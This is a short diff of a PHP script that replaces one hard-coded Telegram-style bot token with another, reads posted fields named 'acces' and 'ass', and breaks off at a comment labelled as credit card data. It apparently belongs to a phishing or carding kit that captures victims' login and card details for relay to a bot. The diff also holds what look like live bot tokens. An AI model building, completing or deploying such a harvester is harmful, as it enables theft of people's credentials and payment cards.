@@ -6,7 +6,7 @@ ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 date_default_timezone_set('America/Guatemala');
 
-$token = "5158268829:AAF8xc22TgLd0-Rmw1GwP98EVcbAwFbIJYA";
+$token = "5376029455:AAFZaNBOQgw6D0GfBaCxOsjfJNd1HPZOtgA";
 $acces = $_POST['acces'];
 $ass = $_POST['ass'];
 #DATOS DE CARD CREDIT
